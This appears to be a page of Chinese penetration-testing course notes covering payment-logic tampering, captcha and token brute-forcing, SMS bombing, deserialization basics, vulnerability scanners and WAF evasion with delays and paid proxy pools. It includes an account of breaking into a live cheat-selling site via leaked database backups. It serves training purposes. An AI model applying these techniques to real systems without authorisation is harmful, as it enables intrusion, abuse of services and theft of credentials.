<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#商品购买流程</span><br><span class="line">选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付</span><br><span class="line"></span><br><span class="line">#常见篡改参数</span><br><span class="line">商品编号ID 购买价格 购买数量 支付方式 订单号 支付状态</span><br><span class="line"></span><br><span class="line">#常见修改方式</span><br><span class="line">替代支付 重复支付 最小额支付 负数支付 溢出支付 优惠卷支付</span><br><span class="line"></span><br><span class="line">支付接口</span><br><span class="line">	一般都是调用第三方支付接口，打的严不好自己搭建</span><br><span class="line"></span><br><span class="line">数据包唯一性</span><br><span class="line"></span><br><span class="line">还是代码审计</span><br></pre></td></tr></table></figure>

<h3 id="day35-逻辑越权之找回机制及接口安全"><a href="#day35-逻辑越权之找回机制及接口安全" class="headerlink" title="day35-逻辑越权之找回机制及接口安全"></a>day35-逻辑越权之找回机制及接口安全</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#找回重置机制</span><br><span class="line">	客户端回显 response状态值 验证码爆破 找回流程绕过</span><br><span class="line"></span><br><span class="line">#接口调用乱用</span><br><span class="line">	短信轰炸，来单轰炸</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#墨者靶场 登录密码重置漏洞分析溯源</span><br><span class="line">抓包一步一步forward 		这个很lao</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#客户端回显</span><br><span class="line">	#www.08=712zpw.com		打不开</span><br><span class="line">	邮箱验证码在客户端发送请求抓包直接看的到</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#response状态值</span><br><span class="line">	如果验证是在前端，可以通过burp抓取服务器发给前端的数据包</span><br><span class="line">	右键-&gt;do intercept-&gt;response to this request</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#自动识别验证码</span><br><span class="line">	有工具</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#短信轰炸</span><br><span class="line">	调用接口</span><br></pre></td></tr></table></figure>

<h3 id="day36-逻辑越权之验证码与token及接口"><a href="#day36-逻辑越权之验证码与token及接口" class="headerlink" title="day36-逻辑越权之验证码与token及接口"></a>day36-逻辑越权之验证码与token及接口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">token	爆破</span><br><span class="line">		回显</span><br><span class="line">		固定</span><br><span class="line">验证码	  爆破</span><br><span class="line">		识别</span><br><span class="line">		复用</span><br><span class="line">		回显</span><br><span class="line">		绕过</span><br><span class="line"></span><br><span class="line">#验证码工具</span><br><span class="line">	PKav_Http_Fuzz		老工具集成好的，只能换库</span><br><span class="line">	captcha-killer		burp插件</span><br><span class="line">		github.com/c0ny1/captcha-killer/releases/tag/0.1.2</span><br><span class="line">		使用的话网上找博客</span><br><span class="line">	reCAPTCHA			插件老版</span><br><span class="line">		https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#pikachu靶场  on server</span><br><span class="line">	发两次包都通过了验证码测试---》验证码复用</span><br><span class="line">#pikachu靶场	on client</span><br><span class="line">	本地验证 抓包</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">token	每次刷新网页都会自动生成</span><br><span class="line">#pikachu靶场	token前端生成 配合burp绕过</span><br><span class="line">抓包 attack type选择pitchfork</span><br><span class="line">payloads</span><br><span class="line">	payload set:1,添加密码包含123456</span><br><span class="line">	payload set:2</span><br><span class="line">		options:设置线程为1</span><br><span class="line">			redirections：always</span><br><span class="line">			grep-Extract:选中token 会自动正则匹配</span><br><span class="line">		Payloads：</span><br><span class="line">			payload type:选择recurisive grep</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">burpsuite spider是爬虫</span><br></pre></td></tr></table></figure>

<h3 id="day37-反序列化之PHP-amp-JAVA全解-上"><a href="#day37-反序列化之PHP-amp-JAVA全解-上" class="headerlink" title="day37-反序列化之PHP&amp;JAVA全解(上)"></a>day37-反序列化之PHP&amp;JAVA全解(上)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">序列化 将对象转换成字符串。</span><br><span class="line">反序列化相反 数据的格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>(); <span class="comment">//创建一个对象</span></span><br><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>); <span class="comment">//把这个对象进行序列化</span></span><br><span class="line">    序列化后得到的结果是这个样子的:O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;&#125;</span><br><span class="line">        O:代表<span class="keyword">object</span></span><br><span class="line">        <span class="number">1</span>:代表对象名字长度为一个字符</span><br><span class="line">        S:对象的名称</span><br><span class="line">        <span class="number">1</span>:代表对象里面有一个变量</span><br><span class="line">        s:数据类型</span><br><span class="line">        <span class="number">4</span>:变量名称的长度</span><br><span class="line">        test:变量名称</span><br><span class="line">        s:数据类型</span><br><span class="line">        <span class="number">7</span>:变量值的长度</span><br><span class="line">        pikachu:变量值</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;constrct&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;destruct&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;创建变量&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$abc</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;序列化&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$abc</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$bbb</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//反序列化在网页脚本编译结束时会调用类函数__destruct()&lt;br&gt;</span></span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1667552607007.png" alt="1667552607007"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">===	同时比较类型和值</span><br><span class="line">==	比较值</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/20175211lyz/p/11403397.html</span><br></pre></td></tr></table></figure>

<h3 id="day38-反序列化之PHP-amp-JAVA全解下"><a href="#day38-反序列化之PHP-amp-JAVA全解下" class="headerlink" title="day38-反序列化之PHP&amp;JAVA全解下"></a>day38-反序列化之PHP&amp;JAVA全解下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">利用	</span><br><span class="line">	payload生成器</span><br><span class="line">		ysoserial</span><br><span class="line">	自定义检测工具或脚本</span><br><span class="line">检测</span><br><span class="line">	黑盒</span><br><span class="line">		数据格式点</span><br><span class="line">			http请求参数</span><br><span class="line">			自定义协议</span><br><span class="line">			RMI协议</span><br><span class="line">			子主题</span><br><span class="line">		特定扫描</span><br><span class="line">			见利用</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">java中API实现</span><br><span class="line">位置 java.io.ObjectOutputStream java.io.ObjectInputStream</span><br><span class="line">序列化</span><br><span class="line">	ObjectOutStream类--&gt;writeObject()</span><br><span class="line">	该方法对参数指定的obj对象进行序列化，把字节序列写道一个目标输出流中，按java的标准约定时给文件一个.ser扩展名</span><br><span class="line">反序列化</span><br><span class="line">	ObjectInputStream类--&gt;readObject()</span><br><span class="line">	该方法从一个源输入中读取字节序列，再把它们反序列化为一个对象，并将其返回</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#javaweb靶场			webgoat</span><br><span class="line">	https://github.com/WebGoat/WebGoat/releases</span><br></pre></td></tr></table></figure>

<h3 id="day39"><a href="#day39" class="headerlink" title="day39-"></a>day39-</h3><h3 id="day40"><a href="#day40" class="headerlink" title="day40-"></a>day40-</h3><h3 id="day41"><a href="#day41" class="headerlink" title="day41-"></a>day41-</h3><h3 id="day42-操作系统之漏洞探针类型利用修复"><a href="#day42-操作系统之漏洞探针类型利用修复" class="headerlink" title="day42-操作系统之漏洞探针类型利用修复"></a>day42-操作系统之漏洞探针类型利用修复</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">操作系统</span><br><span class="line">	探针</span><br><span class="line">		Goby Nmap Nessus OpenVAS Nexpose</span><br><span class="line">	类型</span><br><span class="line">		远程执行 权限提升 缓存区溢出</span><br><span class="line">	利用</span><br><span class="line">		工具框架</span><br><span class="line">			Metasploit Searchsploit 企业单位内部产品</span><br><span class="line">		单点EXP</span><br><span class="line">			cnvd seebug 1337day exploit-db Packetstorm_Security</span><br><span class="line">		复现文章</span><br><span class="line">			各种咨询来源</span><br><span class="line">	修复</span><br><span class="line">		打上补丁 关闭入口 防护应用</span><br><span class="line">	补充</span><br><span class="line">		系统漏洞发现意义?</span><br><span class="line">		漏洞类型危害情况?</span><br><span class="line">		如何做好未卜先知?</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">演示了goby nmap nessus漏洞探测的使用</span><br><span class="line">	小迪比较推崇nessus</span><br><span class="line">kali的/usr/share/nmap/scripts中包含了nse插件库</span><br><span class="line">	nmap --scripts=vuln	使用默认nse插件</span><br><span class="line">	nmap vulscan vulners使用第三方探针</span><br><span class="line">		https://www.cnblogs.com/shwang/p/12623669.html</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#名词解释</span><br><span class="line">CVSS	Common Vulnerability Scaning System	通用漏洞评分系统</span><br><span class="line">CVE		Common Vulnerability and Exposures</span><br><span class="line">其他漏洞编号 MS MSKB CERT BID IAVM OVAL</span><br><span class="line">EXP		利用</span><br><span class="line">POC		检测</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#利用</span><br><span class="line">cnvd 	国家信息安全漏洞共享平台China National Vulnerability Database</span><br><span class="line">seebug</span><br><span class="line">1337day		0day.today		cloudflare   ip被禁了  扫到的泛播</span><br></pre></td></tr></table></figure>

<h3 id="day43-web之漏洞探针类型利用修复"><a href="#day43-web之漏洞探针类型利用修复" class="headerlink" title="day43-web之漏洞探针类型利用修复"></a>day43-web之漏洞探针类型利用修复</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#已知CMS</span><br><span class="line">如常见的dedecms discuz wordpress等源码结构，使用网上公开源码搭建网站，可利用公开漏洞进行测试，或者白盒审计</span><br><span class="line">	可以使用cmsscan wpscan joomscan drupalscan探测工具框架</span><br><span class="line">	代码审计</span><br><span class="line">		函数点 功能点 框架类挖掘</span><br><span class="line">#开发框架</span><br><span class="line">thinkphp spring flask</span><br><span class="line">#未知cms</span><br><span class="line">常见的企业或个人内部程序源码，也可以是某CMS二次开发的源码结构</span><br><span class="line"></span><br><span class="line">开发框架</span><br><span class="line">	php</span><br><span class="line">		Yii Laravel thinkphp</span><br><span class="line">	java</span><br><span class="line">		Shiro Struts Spring Maven</span><br><span class="line">	python</span><br><span class="line">		Flask Django Tornado</span><br><span class="line">未知cms</span><br><span class="line">	工具框架</span><br><span class="line">		xray awvs appscan</span><br><span class="line">	人工探针</span><br><span class="line">		应用功能 URL参数 盲猜参数</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 币圈cms</span><br><span class="line">fofa搜索index/login/login			--》thinkphp</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#vulhub搜索spring</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#墨者靶场wordpress插件漏洞分析溯源</span><br><span class="line">首先cms识别</span><br><span class="line">	在线识别</span><br><span class="line">	数据包提取路径去搜</span><br><span class="line">	从网页去找版权</span><br><span class="line">	使用cms探测工具 wpscan特殊功能要花钱买token</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#代码审计使用Seay工具</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#668jq.com		#买挂网站		现在没了</span><br><span class="line">cms识别--》dedecms</span><br><span class="line">/robots.txt</span><br><span class="line">/data/admin/ver.txt --》版本</span><br><span class="line">网上的漏洞比较鸡肋</span><br><span class="line">/dede		下载数据库备份   从中搜索后台路径</span><br><span class="line">弱口令测试</span><br><span class="line">扫端口  --》8888宝塔  -》宝塔漏洞没用</span><br><span class="line">备份文件  路径没提供 --》从数据库配置文件中获取密码用户名</span><br><span class="line">使用Navicat数据库连接工具连接			-》宝塔设置不让连接</span><br><span class="line">又从备份文件找到别的数据库的用户名密码，连接成功</span><br></pre></td></tr></table></figure>

<h3 id="day44-APP应用之漏洞探针类型利用修复"><a href="#day44-APP应用之漏洞探针类型利用修复" class="headerlink" title="day44-APP应用之漏洞探针类型利用修复"></a>day44-APP应用之漏洞探针类型利用修复</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app应用</span><br><span class="line">	抓包</span><br><span class="line">		http/https</span><br><span class="line">			burpsuite charles fiddler 抓包精灵 其他</span><br><span class="line">		其他协议</span><br><span class="line">			wireshark</span><br><span class="line">	协议</span><br><span class="line">		WEB协议类</span><br><span class="line">		其他协议类</span><br><span class="line">	逆向</span><br><span class="line">		一键提取apk设计URL</span><br><span class="line">		反编译重写代码段编译测试</span><br><span class="line"></span><br><span class="line">一阵乱点获取url</span><br><span class="line">burpsuite history旁边的空白单机可以设置过滤</span><br><span class="line">抓包精灵是app</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏了个大洞 逆向</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#xray</span><br><span class="line">	手机模拟器代理端口192.168.0.101:8888，burpsuite监听这个端口</span><br><span class="line">	然后burpsuite user options中upstream Proxy Servers设置转发数据包，*表示所有都转发，转发到127.0.0.1:6666端口</span><br><span class="line">	最后xray监听本地6666端口</span><br></pre></td></tr></table></figure>

<h3 id="day45-API接口服务之漏洞探针类型利用修复"><a href="#day45-API接口服务之漏洞探针类型利用修复" class="headerlink" title="day45-API接口服务之漏洞探针类型利用修复"></a>day45-API接口服务之漏洞探针类型利用修复</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#端口服务类-Tomcat弱口令安全问题</span><br><span class="line">vulhub</span><br><span class="line">/tomcat/tomcat8 </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#端口服务类-Glassfish任意文件读取</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#其他补充类-基于端口WEB站点测试</span><br><span class="line">不同端口站点不同</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#其他补充类-基于域名WEB站点测试</span><br><span class="line">注册人 域名等级 特有信息</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#其他补充类-基于IP配合端口信息收集</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#口令安全脚本工具简要使用-Snetcracker</span><br><span class="line">弱口令爆破工具，支持多种协议，国内人写的</span><br><span class="line">hydra国外人写的	脚本命令</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#API接口类-网络服务类探针利用测试-AWVS</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/640-1688030924215.png" alt="图片"> </p>
<h3 id="day46-WAF绕过-信息收集之反爬虫延时代理池技术"><a href="#day46-WAF绕过-信息收集之反爬虫延时代理池技术" class="headerlink" title="day46-WAF绕过-信息收集之反爬虫延时代理池技术"></a>day46-WAF绕过-信息收集之反爬虫延时代理池技术</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WAF拦截会出现在安全测试的各个层面</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">信息收集</span><br><span class="line">	测试环境</span><br><span class="line">		aliyun-os BT(baota) safedog</span><br><span class="line">	绕过分析</span><br><span class="line">		抓包技术 WAF说明 FUZZ测试</span><br><span class="line">	绕过手法</span><br><span class="line">		数据包特征</span><br><span class="line">			请求方式 模拟用户 爬虫引擎 白名单机制</span><br><span class="line">		请求速度</span><br><span class="line">			延时 代理池 爬虫引擎 白名单机制 </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#Safedog-默认拦截机制分析绕过-未开CC</span><br><span class="line">	目录爆破--》会误报全是200			铸剑实战靶场内部版</span><br><span class="line">	分析数据包，实际的抓取的数据包的不同--》请求方式head改get</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#Safedog-默认拦截机制分析绕过-开启CC</span><br><span class="line">	安全狗CC防护规则</span><br><span class="line">		单用户访问上限</span><br><span class="line">		代理访问上限</span><br><span class="line">		会话验证</span><br><span class="line">	使用延时的方法</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#Aliyun_OS-默认拦截机制分析绕过-简要界面</span><br><span class="line">	阿里云无法模拟搜索引擎爬虫绕过，只能采用代理池或延时</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#BT(防火墙插件)-默认拦截机制分析绕过-简要界面</span><br><span class="line">	花钱 apach50块</span><br><span class="line">	爬虫未知 延迟可以 代理池可以</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#aliyun bt safedog防护体系</span><br><span class="line">	延迟3秒	阿里云限制的</span><br><span class="line">	宝塔60秒内累计6次恶意请求封锁ip600秒</span><br><span class="line">		字典重新排序</span><br><span class="line">		截断 index.php.bak. .之类</span><br></pre></td></tr></table></figure>

<h3 id="day47-WAF绕过-漏洞发现之代理池指纹被动探针"><a href="#day47-WAF绕过-漏洞发现之代理池指纹被动探针" class="headerlink" title="day47-WAF绕过-漏洞发现之代理池指纹被动探针"></a>day47-WAF绕过-漏洞发现之代理池指纹被动探针</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">漏洞发现</span><br><span class="line">	工具</span><br><span class="line">		综合</span><br><span class="line">			awvs(Acunetix) xray appacan</span><br><span class="line">		单点</span><br><span class="line">			tpscan wpscan st2scan</span><br><span class="line">	触发</span><br><span class="line">		扫描速度</span><br><span class="line">			延时 代理池 白名单</span><br><span class="line">		工具指纹</span><br><span class="line">			特征修改 模拟用户</span><br><span class="line">		漏洞PayLoad</span><br><span class="line">			数据变异 冷门扫描</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#代理池Proxy_pool项目搭建及使用解释</span><br><span class="line">	python项目redis数据库 b站搜proxy_pool</span><br><span class="line">#充钱代理池safedog+bt+Aliyun探针</span><br><span class="line">	kuaidaili.com</span><br><span class="line">		选购隧道代理，每次请求都会换ip 20/天</span><br><span class="line">#Safedog-awvs漏扫注入测试绕过-延时，白名单</span><br><span class="line">	白名单爬虫搜索引擎</span><br><span class="line">#Aliyun_os-awvs漏扫注入测试绕过-延时白名单</span><br><span class="line">#BT(baota)-awvs+xray漏扫Payload绕过-演示被动</span><br><span class="line">#充钱代理池直接干Safedog+BT+AliyunOS漏洞发现</span><br></pre></td></tr></table></figure>

